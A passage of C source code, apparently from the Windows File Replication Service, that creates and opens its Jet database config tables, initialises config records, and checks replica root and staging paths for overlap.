                JTableCreate->szTableName, jerr, ERROR_RET_DB);

    ConfigTid = JTableCreate->tableid;
    TableCtx->Tid = JTableCreate->tableid;

    DPRINT(1,"++ Config table created.\n");

    //
    // Initialize the Jet Set/Ret Col arrays and buffer addresses to read and
    // write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);
    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    Status = DbsAllocRecordStorage(TableCtx);
    CLEANUP_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.",
               Status, ERROR_RET_TABLE);

    //
    // Allocate enough record space for the Jet system parameters.
    //
    jerr = DbsReallocateFieldBuffer(TableCtx,
                                    JetParametersx,
                                    sizeof(JET_SYSTEM_PARAMS),
                                    FALSE);
    CLEANUP_JS(0, "ERROR - DbsReallocateFieldBuffer failed:", jerr, ERROR_RET_TABLE);

    //
    // Get pointer to data record and build the FRS system init record.
    //
    ConfigRecord = (PCONFIG_TABLE_RECORD) (TableCtx->pDataRecord);
    FrsUuidCreate(&ReplicaMemberGuid);
    DbsDBInitConfigRecord(TableCtx,
                          &ReplicaMemberGuid,               // ReplicaSetGuid
                          FRS_SYSTEM_INIT_RECORD,           // ReplicaSetName
                          FRS_SYSTEM_INIT_REPLICA_NUMBER,   // ReplicaNumber
                          FRS_SYSTEM_INIT_PATH,             // ReplicaRootPath
                          FRS_SYSTEM_INIT_PATH,             // ReplicaStagingPath
                          FRS_SYSTEM_INIT_PATH);            // ReplicaVolume
#if 0

//    EnterFieldData(TableCtx, LastShutdownx, &SystemTime, sizeof(FILETIME), 0);
//    EnterFieldData(TableCtx, FieldId, SrcData, Len, Flags);

//    Flags : FRS_FIELD_NULL, FRS_FIELD_USE_ADDRESS,
#endif

    //
    // Now insert the FRS system <init> record.
    //
    jerr = DbsInsertTable2(TableCtx);
    CLEANUP_JS(0, "ERROR - DbsInsertTable2 failed inserting <init> config record.",
               jerr, ERROR_RET_TABLE);

    //
    // Create the template tables using ReplicaNumber 0 (DBS_TEMPLATE_TABLE_NUMBER).
    //
    DPRINT(0, "Creating initial template tables.\n");

    jerr = JetBeginTransaction(Sesid);
    CLEANUP_JS(0, "ERROR - JetBeginTran failed creating template tables.",
               jerr, ERROR_RET_TABLE);


    for (i=0; i<TABLE_TYPE_MAX; i++) {

        //
        // To avoid a mutex we copy the DBTable struct to a local and init
        // the table name here instead of writing into the global struct.
        //
        CopyMemory(&TableCreate, &DBTables[i], sizeof(JET_TABLECREATE));
        TableCreate.szTableName = TableName;

        //
        // Create the template table name.
        //
        sprintf(TableName, "%s%05d", DBTables[i].szTableName, DBS_TEMPLATE_TABLE_NUMBER);

        //
        // The first set of table creates use replica number
        // DBS_TEMPLATE_TABLE_NUMBER (0) to make a set of template tables
        // can be used by subsequent creates of the same table type.
        // This ensures that the column IDs of each table of a given type
        // are the same.
        //
        TableCreate.szTemplateTableName = NULL;
        //
        // No initial allocation of pages for the template tables.
        //
        TableCreate.ulPages = 0;

        jerr = DbsCreateJetTable(ThreadCtx, &TableCreate);
        CLEANUP1_JS(1, "Table %s create error:", TableName, jerr, ERROR_RETURN_TEMPLATE);

        jerr = JetCloseTable(Sesid, TableCreate.tableid);
        CLEANUP1_JS(1, "Table %s close error:", TableName, jerr, ERROR_RETURN_TEMPLATE);
    }

    //
    // Commit the table creates.
    //
    jerr = JetCommitTransaction(Sesid, 0);
    CLEANUP_JS(0, "ERROR - JetCommitTran failed creating template tables.",
               jerr, ERROR_RETURN_TEMPLATE);


#if DBG
    //
    // Fill up the jet database using very high replica numbers to more quickly
    // cause out-of-space errors later.
    //
    if (DebugInfo.DbsOutOfSpace) {
        DWORD   j;
        DWORD   DbsOutOfSpace;

        DPRINT(0, "++ DBG - Filling the database\n");
        DbsOutOfSpace = DebugInfo.DbsOutOfSpace;
        DebugInfo.DbsOutOfSpace = 0;
        for (j = 0; j < 1000; ++j) {
            FrsUuidCreate(&ReplicaMemberGuid);
            DbsDBInitConfigRecord(TableCtx,
                                  &ReplicaMemberGuid,               // ReplicaSetGuid
                                  L"DBS_OUT_OF_SPACE",              // ReplicaSetName
                                  DBS_MAX_REPLICA_NUMBER - (j + 1),
                                  FRS_SYSTEM_INIT_PATH,             // ReplicaRootPath
                                  FRS_SYSTEM_INIT_PATH,             // ReplicaStagingPath
                                  FRS_SYSTEM_INIT_PATH              // ReplicaVolume
                                  );
            jerr = DbsInsertTable2(TableCtx);
            if (!JET_SUCCESS(jerr)) {
                goto ERROR_RET_TABLE;
            }
        }
        DebugInfo.DbsOutOfSpace = DbsOutOfSpace;
        DPRINT(0, "++ DBG - DONE Filling the database\n");
    }
#endif DBG

    goto RETURN;


ERROR_RETURN_TEMPLATE:

    //
    // Roll back the table creates.
    //
    jerr1 = JetRollback(Sesid, 0);
    DPRINT_JS(0, "ERROR - JetRollback failed on creating template tables.", jerr1);

    //
    // DEBUG OPTION: Delete fill file
    //
    DBG_DBS_OUT_OF_SPACE_EMPTY(DBG_DBS_OUT_OF_SPACE_OP_CREATE);

//
// Common return path with error entries.  Can't use DbsCloseJetSession since
// this is a DB create and we aren't attached.
//
RETURN:
ERROR_RET_TABLE:
    //
    // Close the table, reset TableCtx Tid and Sesid.    Macro writes 1st arg.
    //
    DbsCloseTable(jerr1, Sesid, TableCtx);
    DPRINT1_JS(0, "++ ERROR - JetCloseTable(%s) :", JTableCreate->szTableName, jerr1);

ERROR_RET_DB:

    jerr1 = JetCloseDatabase(Sesid, Dbid, 0);
    DPRINT1_JS(0, "++ ERROR - JetCloseDatabase(%s) :", JetFileA, jerr1);

    TableCtx->Tid = JET_tableidNil;
    ThreadCtx->JDbid = JET_dbidNil;

ERROR_RET_SESSION:

    jerr1 = JetEndSession(Sesid, 0);
    DPRINT1_JS(0, "++ ERROR - JetEndSession(%s) :", JetFileA, jerr1);

    TableCtx->Sesid = JET_sesidNil;
    ThreadCtx->JSesid = JET_sesidNil;

ERROR_RET_TERM:

    jerr1 = JetTerm(JInstance);
    DPRINT1_JS(0, "++ ERROR - JetTerm(%s) :", JetFileA, jerr1);

    if (JET_SUCCESS(jerr1)) {
        DPRINT2(1, "++ JetTerm(%s) %s complete\n", JetFileA, JTableCreate->szTableName);
    }

    ThreadCtx->JInstance = JET_instanceNil;
    GJetInstance = JET_instanceNil;

ERROR_RET_NOJET:

    if (JET_SUCCESS(jerr)) {
        //
        // Copy this to a Backup.
        //
        // CopyFileA(szJetFilePath, "T:\\NEWFRS.JDB", FALSE);
    } else {
        //LogUnhandledError(jerr);
    }
    //
    // Shutdown if the database volume is full
    //
    DbsExitIfDiskFull(jerr);
    DbsExitIfDiskFull(jerr1);

    return jerr;
}



VOID
DbsDBInitConfigRecord(
    IN PTABLE_CTX   TableCtx,
    IN GUID  *ReplicaSetGuid,
    IN PWCHAR ReplicaSetName,
    IN ULONG  ReplicaNumber,
    IN PWCHAR ReplicaRootPath,
    IN PWCHAR ReplicaStagingPath,
    IN PWCHAR ReplicaVolume
    )
/*++

Routine Description:

    Fill in the fields of a config record.

Arguments:

    TableCtx            - ptr to the table context for the replica
    ReplicaSetGuid      - ptr to GUID assigned to the replica set.
    ReplicaSetName      - replica set name, unicode
    ReplicaNumber       - internal replica ID number
    ReplicaRootPath     - Root path to the base of the replica set (unicode)
    ReplicaStagingPath  - Path to file replication staging area
    ReplicaVolume       - NTFS Volume the replica tree lives on.

Return Value:

    None

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsDBInitConfigRecord:"

    FILETIME        SystemTime;
    HANDLE          FileHandle;
    IO_STATUS_BLOCK Iosb;
    PFILE_FS_VOLUME_INFORMATION VolumeInfo;
    ULONG           VolumeInfoLength;
    DWORD           WStatus;
    NTSTATUS        Status;
    ULONG           Length;
    PCONFIG_TABLE_RECORD    ConfigRecord = TableCtx->pDataRecord;
    CHAR            TimeStr[TIME_STRING_LENGTH];

    //
    // The size of var len DT_BINARY records must be set in the Type/Size
    // prefix so DbsInsertTable2 knows how big it is.
    //
    //
    // For now make the ReplicaSetGuid and the ReplciaMemberGuid the same.
    // The DS init will change the ReplicaSetGuid to the Guid on the
    // set object and the ReplicaRootGuid will be newly created.
    //
    COPY_GUID(&ConfigRecord->ReplicaSetGuid,    ReplicaSetGuid);
    COPY_GUID(&ConfigRecord->ReplicaMemberGuid, ReplicaSetGuid);
    COPY_GUID(&ConfigRecord->ReplicaRootGuid,   ReplicaSetGuid);

    wcsncpy(ConfigRecord->ReplicaSetName, ReplicaSetName, DNS_MAX_NAME_LENGTH + 1);
    ConfigRecord->ReplicaSetName[DNS_MAX_NAME_LENGTH] = L'\0';

    ConfigRecord->ReplicaNumber = ReplicaNumber;
    ConfigRecord->ReplicaMemberUSN = 0;

    ConfigRecord->DSConfigVersionNumber = 0;


    FrsUuidCreate(&ConfigRecord->FSVolGuid);
    FrsUuidCreate(&ConfigRecord->ReplicaVersionGuid);

    ConfigRecord->FSVolLastUSN = 0;

    ConfigRecord->FrsVsn = 0;

    //
    // LastShutdown must start out as 0 when the replica set is first
    // created so we know to start reading the USN journal at its current
    // location.
    //
    ConfigRecord->LastShutdown = 0;

    GetSystemTimeAsFileTime(&SystemTime);
    COPY_TIME(&ConfigRecord->LastPause,             &SystemTime);
    COPY_TIME(&ConfigRecord->LastDSCheck,           &SystemTime);
    COPY_TIME(&ConfigRecord->LastReplCycleStart,    &SystemTime);
    COPY_TIME(&ConfigRecord->DirLastReplCycleEnded, &SystemTime);

    //LastReplCycleStatus;

    wcsncpy(ConfigRecord->FSRootPath, ReplicaRootPath,ARRAY_SZ(ConfigRecord->FSRootPath)-1);
    ConfigRecord->FSRootPath[ARRAY_SZ(ConfigRecord->FSRootPath)-1] = L'\0';

    wcsncpy(ConfigRecord->FSStagingAreaPath, ReplicaStagingPath,ARRAY_SZ(ConfigRecord->FSStagingAreaPath)-1);
    ConfigRecord->FSStagingAreaPath[ARRAY_SZ(ConfigRecord->FSStagingAreaPath)-1] = L'\0';

    //
    // VOLUME_INFORMATION   FSVolInfo;
    //
    if (WSTR_NE(ReplicaRootPath, FRS_SYSTEM_INIT_PATH)) {
        WStatus = FrsOpenSourceFileW(&FileHandle, ReplicaVolume,
                                     READ_ATTRIB_ACCESS,
                                     OPEN_OPTIONS);
        if (WIN_SUCCESS(WStatus)) {

            VolumeInfoLength = sizeof(*VolumeInfo)+MAXIMUM_VOLUME_LABEL_LENGTH;
            VolumeInfo = ConfigRecord->FSVolInfo;

            //
            // Get the info.
            //
            Status = NtQueryVolumeInformationFile(FileHandle,
                                                  &Iosb,
                                                  VolumeInfo,
                                                  VolumeInfoLength,
                                                  FileFsVolumeInformation);
            if ( NT_SUCCESS(Status) ) {

                VolumeInfo->VolumeLabel[VolumeInfo->VolumeLabelLength/2] = UNICODE_NULL;
                FileTimeToString((PFILETIME) &VolumeInfo->VolumeCreationTime, TimeStr);

                DPRINT5(4,"++ %-16ws (%d), %s, VSN: %08X, VolCreTim: %s\n",
                        VolumeInfo->VolumeLabel,
                        VolumeInfo->VolumeLabelLength,
                       (VolumeInfo->SupportsObjects ? "(obj)" : "(no-obj)"),
                        VolumeInfo->VolumeSerialNumber,
                        TimeStr);

            } else {
                DPRINT_NT(0, "++ ERROR - Replica root QueryVolumeInformationFile failed.", Status);
            }

            //
            // Close the file and check for errors.
            //
            Status = NtClose(FileHandle);

            if (!NT_SUCCESS(Status)) {
                DPRINT_NT(0, "++ ERROR - Close file handle failed on Replica root.", Status);
            }

        } else {
            DPRINT_WS(0, "++ ERROR - Replica root open failed;", WStatus);
        }
    }

    // *FSRootSD;
    //SnapFileSizeLimit;
    //ActiveServCntlCommand;
    ConfigRecord->ServiceState = CNF_SERVICE_STATE_CREATING;

    ConfigRecord->ReplDirLevelLimit = 0x7FFFFFFF;

    //InboundPartnerState;

    wcsncpy(ConfigRecord->AdminAlertList,
            TEXT("Admin1, Admin2, ..."),
            INITIAL_BINARY_FIELD_ALLOCATION/sizeof(WCHAR));
    ConfigRecord->AdminAlertList[(INITIAL_BINARY_FIELD_ALLOCATION/sizeof(WCHAR))-1] = L'\0';

    //ThrottleSched;
    //ReplSched;
    //FileTypePrioList;

    //ResourceStats;
    //PerfStats;
    //ErrorStats;

    ConfigRecord->TombstoneLife = ParamTombstoneLife;     // days
    //GarbageCollPeriod;
    //MaxOutBoundLogSize;
    //MaxInBoundLogSize;
    //UpdateBlockedTime;
    //EventTimeDiffThreshold;
    //FileCopyWarningLevel;
    //FileSizeWarningLevel;
    //FileSizeNoRepLevel;

    //
    // The following fields are only present in the system init config record.
    //
    if (ReplicaNumber == FRS_SYSTEM_INIT_REPLICA_NUMBER) {
        Length = MAX_RDN_VALUE_SIZE+1;
        GetComputerName(ConfigRecord->MachineName, &Length );

        FrsUuidCreate(&ConfigRecord->MachineGuid);

        wcsncpy(ConfigRecord->FSDatabasePath, JetFile, MAX_PATH + 1);
        ConfigRecord->FSDatabasePath[MAX_PATH] = L'\0';

        wcsncpy(ConfigRecord->FSBackupDatabasePath, JetFile, MAX_PATH + 1);
        ConfigRecord->FSBackupDatabasePath[MAX_PATH] = L'\0';

        CopyMemory(ConfigRecord->JetParameters, &JetSystemParamsDef, sizeof(JetSystemParamsDef));
        DbsPackStrW(ServerPrincName, ReplicaPrincNamex, TableCtx);
    }

    return;
}



JET_ERR
DbsOpenConfig(
    IN OUT PTHREAD_CTX    ThreadCtx,
    IN OUT PTABLE_CTX     TableCtx
    )
/*++

Routine Description:

    This function opens the config table and reads the FRS init record to get
    system parameters.  It then restarts Jet using the appropriate Jet params.

    If we fail find the system init record we return JET_errInvalidDatabase.
    This forces a rebuild of the database.

Arguments:

    ThreadCtx   - The thread context.  The Jet instance, session id and DB ID
                  are returned here.

    TableCtx    - Table context for the Config table.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsOpenConfig:"

    JET_ERR    jerr, jerr1;
    ULONG      i;

    JET_INSTANCE  JInstance;
    JET_SESID     Sesid;
    JET_DBID      Dbid;
    JET_TABLEID   ConfigTid;
    PCONFIG_TABLE_RECORD ConfigRecord;

    BOOL                Tried1414Fix = FALSE;
    PJET_SYSTEM_PARAMS  JetSystemParams;
    PJET_PARAM_ENTRY    Jpe;

    BOOL      FirstTime = TRUE;
    ULONG     ActualLength;
    ULONG_PTR Lvalue;

    CHAR   StrValue[100];
    WCHAR  CommandLine[MAX_CMD_LINE];



    DPRINT1(5, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    //
    // Initialize Jet returning the handle.
    //
    jerr = DbsInitJet(&JInstance);
    CLEANUP_JS(0, "ERROR - DbsInitJet failed:", jerr, ERROR_RET_NOJET);


REINIT_JET:

    ThreadCtx->JInstance = JInstance;
    GJetInstance = JInstance;

    //
    // Setup a Jet Session returning the session ID and Dbid in ThreadCtx.
    //
    jerr = DbsCreateJetSession(ThreadCtx);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(1, "++ ERROR - DbsCreateJetSession:", jerr);

        //
        // perform a manual recovery process for -1414 in the event log.
        //
        // 4/10/2000 - Supposedly jet has been fixed to allow us to reconstruct the
        // indexes on tables with fixed ddls.  When this tests ok then the
        // following workaround can be removed.
        //
        if (jerr == JET_errSecondaryIndexCorrupted) {

            //
            // Fork a process to run utility for the user.
            //
            // "esentutl /d %JetFile /l%JetLog /s%JetSys".
            //
            // 03/22/2002 : The parameters for esentutl have changed.
            // "%windir%\system32\esentutl.exe /d %JetFile"
            //
            if (!Tried1414Fix) {

                DPRINT(0,"++ Attempting corrective action.\n");

                JetTerm(JInstance);

                Tried1414Fix = TRUE;

                _snwprintf(CommandLine, ARRAY_SZ(CommandLine), L"esentutl /d %ws", JetFile);
                CommandLine[ARRAY_SZ(CommandLine)-1] = L'\0';
                DPRINT1(0,"++ Running: %ws\n", CommandLine);

                jerr = FrsRunProcess(L"%SystemRoot%\\system32\\esentutl.exe",
                                     CommandLine,
                                     INVALID_HANDLE_VALUE,
                                     INVALID_HANDLE_VALUE,
                                     INVALID_HANDLE_VALUE);

                DPRINT_JS(0, "++ esentutl status:", jerr);
                DPRINT(0,"++ Retrying database init\n");
                jerr = JetInit(&JInstance);
                CLEANUP1_JS(0, "++ ERROR - JetInit with %s :", JetFileA, jerr, ERROR_RET_NOJET);
                goto REINIT_JET;
            }
            //
            // esentutl didn't fix the problem.
            //
            EPRINT2(EVENT_FRS_JET_1414, ComputerName, JetFile);
        }

        if (DbsTranslateJetError(jerr, FALSE) == FrsErrorDatabaseCorrupted) {
            //
            // Added for Testing.
            //
            DPRINT(0, "++ Database corrupted *****************\n");
        }

        goto ERROR_RET_TERM;
    }

    Sesid = ThreadCtx->JSesid;
    Dbid  = ThreadCtx->JDbid;

    DPRINT(4,"++ DbsOpenConfig - JetOpenDatabase complete\n");

    //
    // Dump the Jet system parameters.
    //
    for (i=0; i<MAX_JET_SYSTEM_PARAMS; i++) {
        if (JetSystemParamsDef.ParamEntry[i].ParamType == JPARAM_TYPE_LAST) {
            break;
        }
        Lvalue = 0;
        StrValue[0] = '\0';

        jerr = JetGetSystemParameter(JInstance,
                                     Sesid,
                                     JetSystemParamsDef.ParamEntry[i].ParamId,
                                     &Lvalue,
                                     StrValue,
                                     sizeof(StrValue));

        DPRINT3(1, "++ %-25s: %8d, %s\n",
               JetSystemParamsDef.ParamEntry[i].ParamName, (ULONG)Lvalue, StrValue);

    }
    //
    // On the first time through read the init config record and reinit
    // Jet if required.
    //
    if (FirstTime) {
        FirstTime = FALSE;

        //
        // This opens the Table if it's not already open.
        //
        //
        // Recreate any deleted indexes.
        //
        // An index may get deleted during the call to JetAttachDatabase()
        // when the JET_bitDbDeleteCoruptIndexes grbit is set. Jet
        // normally marks indexes as corrupt when the build number
        // changes because jet has no way of knowing if the collating
        // sequence in the current build is different than those in
        // other builds.
        //
        jerr = DbsRecreateIndexes(ThreadCtx, TableCtx);
        CLEANUP_JS(0, "++ ERROR - DbsRecreateIndexes:", jerr, ERROR_RET_TABLE);

        ConfigRecord = (PCONFIG_TABLE_RECORD) (TableCtx->pDataRecord);

        wcsncpy(ConfigRecord->ReplicaSetName, TEXT("This is junk"), DNS_MAX_NAME_LENGTH + 1);
        ConfigRecord->ReplicaSetName[DNS_MAX_NAME_LENGTH] = L'\0';

        ConfigRecord->ReplicaMemberGuid.Data1 = 0;
        ConfigRecord->ReplicaNumber = FRS_SYSTEM_INIT_REPLICA_NUMBER;

        jerr = DbsReadRecord(ThreadCtx,
                             &ConfigRecord->ReplicaNumber,
                             ReplicaNumberIndexx,
                             TableCtx);

        if (!JET_SUCCESS(jerr)) {
            DPRINT_JS(0, "++ ERROR - DbsReadRecord:", jerr);
            if (jerr == JET_errRecordNotFound) {
                //
                // No system init record means database not initialized.
                //
                jerr = JET_errNotInitialized;
                DbsTranslateJetError(jerr, TRUE);
            }
            goto ERROR_RET_TABLE;
        }

        // DUMP_TABLE_CTX(TableCtx);
        DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);
        ConfigTid = TableCtx->Tid;


        //
        //  Check the init config record for Jet init params.
        //  The first param type that changes a setting causes us to
        //  stop Jet, set the new parameters and restart.  First check that
        //  the system parameter field looks reasonable.
        //
        ConfigRecord = (PCONFIG_TABLE_RECORD) (TableCtx->pDataRecord);
        JetSystemParams = ConfigRecord->JetParameters;

        ActualLength = FRS_GET_RFIELD_LENGTH_ACTUAL(TableCtx, JetParametersx);
        DbsDisplayJetParams(JetSystemParams, ActualLength);


        if ((ActualLength == sizeof(JET_SYSTEM_PARAMS)) &&
            (JetSystemParams != NULL)  &&
            (JetSystemParams->ParamEntry[MAX_JET_SYSTEM_PARAMS-1].ParamType
                == JPARAM_TYPE_LAST)) {

#if 0
    // Note:  left as example code but deleted since params may change (e.g., jet path)
            i = 0;
            while (JetSystemParams->ParamEntry[i].ParamType == JPARAM_TYPE_SKIP) {
                i += 1;
            }

            if (JetSystemParams->ParamEntry[i].ParamType != JPARAM_TYPE_LAST) {
                //
                // Close the table, reset TableCtx Tid and Sesid.
                // Close Jet.  DbsCloseTable is a Macro writes 1st arg.
                //

                DPRINT(0, "++ Closing Jet and setting new parameters.\n");
                DbsCloseTable(jerr, Sesid, TableCtx);
                JetCloseDatabase(Sesid, Dbid, 0);
                InterlockedDecrement(&OpenDatabases);
                JetDetachDatabase(Sesid, JetFileA);
                JetEndSession(Sesid, 0);
                JetTerm(JInstance);

                //
                // Set up the new Jet Parameters.
                //
                Jpe = JetSystemParams->ParamEntry;
                while (Jpe->ParamType != JPARAM_TYPE_LAST) {

                    switch (Jpe->ParamType) {

                    case JPARAM_TYPE_SKIP:

                        break;


                    case JPARAM_TYPE_LONG:
                        DPRINT2(0, "++ %-24s : %d\n", Jpe->ParamName, Jpe->ParamValue);

                        jerr = JetSetSystemParameter(
                            &JInstance, Sesid, Jpe->ParamId, Jpe->ParamValue, NULL);

                        DPRINT1_JS(0, "++ ERROR - Failed to set Jet System Parameter: %s :",
                                   Jpe->ParamName, jerr);
                        break;


                    case JPARAM_TYPE_STRING:
                        DPRINT2(0, "++ %-24s : %s\n", Jpe->ParamName,
                            (PCHAR)JetSystemParams+Jpe->ParamValue);

                        jerr = JetSetSystemParameter(
                            &JInstance, Sesid, Jpe->ParamId, 0,
                            ((PCHAR) JetSystemParams) + Jpe->ParamValue);

                        DPRINT1_JS(0, "++ ERROR - Failed to set Jet System Parameter: %s :",
                                   Jpe->ParamName, jerr);
                        break;


                    default:

                        DPRINT3(0, "++ ERROR - %-24s : %s <invalid parameter type, %d>\n",
                            Jpe->ParamName,
                            (PCHAR)JetSystemParams+Jpe->ParamValue,
                            Jpe->ParamType);

                    } // end switch

                    Jpe += 1;
                }
                //
                // Reinitialize Jet
                //
                DPRINT(0, "++ New parameters set, restarting jet.\n");
                jerr = JetInit(&JInstance);
                CLEANUP1_JS(0, "++ ERROR - JetInit with %s :", JetFileA, jerr, ERROR_RET_NOJET);
                goto REINIT_JET;
            }
#endif 0
        } else {
            DPRINT2(0, "++ ERROR - JetSystemParams struct invalid. Base/Len: %08x/%d\n",
                    JetSystemParams, ActualLength);
            //
            // No system init record means database not initialized.
            //
            jerr = JET_errNotInitialized;
            DbsTranslateJetError(jerr, TRUE);

            //
            // Dump the config table in replic name order.
            //
            DbsDumpTable(ThreadCtx, TableCtx, ReplicaSetNameIndexx);


            goto ERROR_RET_TABLE;
        }

    } // if(FirstTime)

    //
    // Return the jet context to the caller.
    //
    GJetInstance = JInstance;
    ThreadCtx->JInstance  = JInstance;
    ThreadCtx->JSesid     = Sesid;
    ThreadCtx->JDbid      = Dbid;

    return jerr;


//
// Error return paths
//

ERROR_RET_TABLE:
    //
    // Close the table, reset TableCtx Tid and Sesid.  Macro writes 1st arg.
    //
    DbsCloseTable(jerr1, Sesid, TableCtx);

ERROR_RET_DB:
    JetCloseDatabase(Sesid, Dbid, 0);

ERROR_RET_ATTACH:
    JetDetachDatabase(Sesid, JetFileA);

ERROR_RET_SESSION:
    JetEndSession(Sesid, 0);

ERROR_RET_TERM:
    JetTerm(JInstance);

ERROR_RET_NOJET:
    //LogUnhandledError(jerr);

    GJetInstance = JET_instanceNil;
    ThreadCtx->JInstance = JET_instanceNil;
    ThreadCtx->JSesid = JET_sesidNil;
    ThreadCtx->JDbid  = JET_dbidNil;

    return jerr;
}


ULONG
DbsCheckForOverlapErrors(
    IN PREPLICA     Replica
    )
/*++

Routine Description:

    This function checks if the passed in replica set overlaps with any
    existing replica sets. Following overlaps are checked.

    ReplicaRoot  - OtherReplicaRoot
    ReplicaRoot  - OtherReplicaStage
    ReplicaRoot  - ReplicaStage
    ReplicaRoot  - Log Directory.
    ReplicaRoot  - Working Directory
    ReplicaStage - OtherReplicaRoot


Arguments:

    Replica New or reanimating replica set.

Return Value:

    Frs Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCheckForOverlapErrors:"

    DWORD                WStatus;
    ULONG                FStatus                = FrsErrorSuccess;
    PVOID                Key;
    PREPLICA             DbReplica;
    PWCHAR               DebugInfoLogDir         = NULL;
    PWCHAR               ReplicaRoot             = NULL;
    PWCHAR               TraversedWorkingPath    = NULL;
    PWCHAR               ReplicaStage            = NULL;
    PWCHAR               DbReplicaRoot           = NULL;
    PWCHAR               DbReplicaStage          = NULL;

    //
    // Check for invalid nesting of Replica Root, working path and staging path.
    //
    WStatus = FrsTraverseReparsePoints(Replica->Root, &ReplicaRoot);
    if ( !WIN_SUCCESS(WStatus) ) {
        DPRINT2(0,"ERROR - FrsTraverseReparsePoints for %ws, WStatus = %d\n", Replica->Root, WStatus);
    }

    WStatus = FrsTraverseReparsePoints(WorkingPath, &TraversedWorkingPath);
    if ( !WIN_SUCCESS(WStatus) ) {
        DPRINT2(0,"ERROR - FrsTraverseReparsePoints for %ws, WStatus = %d\n", WorkingPath, WStatus);
    }

    if (ReplicaRoot && TraversedWorkingPath && FrsIsParent(ReplicaRoot, TraversedWorkingPath)) {

        EPRINT2(EVENT_FRS_OVERLAPS_WORKING, Replica->Root, WorkingPath);

        FStatus = FrsErrorResourceInUse;

        CLEANUP4_FS(3, ":S: ERROR - Working directory, %ws, overlaps set %ws\\%ws's root, %ws.",
                    WorkingPath, Replica->ReplicaName->Name,
                    Replica->MemberName->Name, Replica->Root, FStatus, ERROR_RETURN_OVERLAP);
    }

    WStatus = FrsTraverseReparsePoints(Replica->Stage, &ReplicaStage);
    if ( !WIN_SUCCESS(WStatus) ) {
        DPRINT2(0,"ERROR - FrsTraverseReparsePoints for %ws, WStatus = %d\n", Replica->Stage, WStatus);
    }

    if (ReplicaRoot && ReplicaStage && FrsIsParent(ReplicaRoot, ReplicaStage)) {

        EPRINT2(EVENT_FRS_OVERLAPS_STAGE, Replica->Root, Replica->Stage);

        FStatus = FrsErrorResourceInUse;

        CLEANUP4_FS(3, ":S: ERROR - Staging directory, %ws, overlaps set %ws\\%ws's root, %ws.",
                Replica->Stage, Replica->ReplicaName->Name,
                Replica->MemberName->Name, Replica->Root, FStatus, ERROR_RETURN_OVERLAP);
    }

    //
    // Logging path overlaps a replica set
    //
    if (!DebugInfo.Disabled && DebugInfo.LogDir) {
        if (ReplicaRoot && DebugInfoLogDir && FrsIsParent(ReplicaRoot, DebugInfoLogDir)) {

            EPRINT2(EVENT_FRS_OVERLAPS_LOGGING, Replica->Root, DebugInfo.LogFile);

            FStatus = FrsErrorResourceInUse;

            CLEANUP4_FS(3, ":S: ERROR - Logging directory, %ws, overlaps set %ws\\%ws's root, %ws.\n",
                    DebugInfo.LogFile, Replica->ReplicaName->Name,
                    Replica->MemberName->Name, Replica->Root, FStatus, ERROR_RETURN_OVERLAP);
        }
    }

    //
    // Check against all the other replica sets.
    //
    Key = NULL;
    while (DbReplica = RcsFindNextReplica(&Key)) {

        //
        // Don't check tombstoned members
        //
        if (!IS_TIME_ZERO(DbReplica->MembershipExpires)) {
            continue;
        }

        //
        // Don't check with itself. This can happen when we are trying to
        // reanimate an old replica set.
        //
        if (GUIDS_EQUAL(Replica->ReplicaName->Guid, DbReplica->ReplicaName->Guid)) {
            continue;
        }

        //
        // Check if the Root path, staging path or working path of the
        // new replica intersect with any existing replica set on this computer.
        //
        // The new replica's root or stage can't be under an existing
        // replica root or vice-versa.
        //
        DbReplicaRoot = FrsFree(DbReplicaRoot);
        WStatus = FrsTraverseReparsePoints(DbReplica->Root, &DbReplicaRoot);
        if ( !WIN_SUCCESS(WStatus) ) {
            DPRINT2(0,"ERROR - FrsTraverseReparsePoints for %ws, WStatus = %d\n", DbReplica->Root, WStatus);
        }

        if (DbReplicaRoot && ReplicaRoot && FrsIsParent(DbReplicaRoot, ReplicaRoot)) {

            EPRINT2(EVENT_FRS_OVERLAPS_ROOT, Replica->Root, DbReplica->Root);

            FStatus = FrsErrorResourceInUse;

            CLEANUP4_FS(3, ":S: ERROR - Root directory, %ws, overlaps set %ws\\%ws's root, %ws.",
                    Replica->Root, DbReplica->ReplicaName->Name,
                    DbReplica->MemberName->Name, DbReplica->Root, FStatus, ERROR_RETURN_OVERLAP);
        }

        if (DbReplicaRoot && ReplicaStage && FrsIsParent(DbReplicaRoot, ReplicaStage)) {

            EPRINT3(EVENT_FRS_OVERLAPS_OTHER_STAGE,
                    Replica->Root, Replica->Stage, DbReplica->Root);

            FStatus = FrsErrorResourceInUse;

            CLEANUP4_FS(3, ":S: ERROR - Staging directory, %ws, overlaps set %ws\\%ws's root, %ws.",
                    Replica->Stage, DbReplica->ReplicaName->Name,
                    DbReplica->MemberName->Name, DbReplica->Root, FStatus, ERROR_RETURN_OVERLAP);
        }

        //
        // An existing replica stage can't be under the new replica root or
        // vice-versa.
        //
        DbReplicaStage = FrsFree(DbReplicaStage);
        WStatus = FrsTraverseReparsePoints(DbReplica->Stage, &DbReplicaStage);
        if ( !WIN_SUCCESS(WStatus) ) {
            DPRINT2(0,"ERROR - FrsTraverseReparsePoints for %ws, WStatus = %d\n", DbReplica->Stage, WStatus);
        }

        if (ReplicaRoot && DbReplicaStage && FrsIsParent(ReplicaRoot, DbReplicaStage)) {

            EPRINT3(EVENT_FRS_OVERLAPS_OTHER_STAGE,
                    Replica->Root, DbReplica->Stage, DbReplica->Root);

            FStatus = FrsErrorResourceInUse;

            CLEANUP4_FS(3, ":S: ERROR - Root directory, %ws, overlaps set %ws\\%ws's staging dir, %ws.\n",
                    Replica->Root, DbReplica->ReplicaName->Name,
                    DbReplica->MemberName->Name, DbReplica->Stage, FStatus, ERROR_RETURN_OVERLAP);
        }

    }   // End loop over existing replica sets.

ERROR_RETURN_OVERLAP:

    FrsFree(DebugInfoLogDir);
    FrsFree(ReplicaRoot);
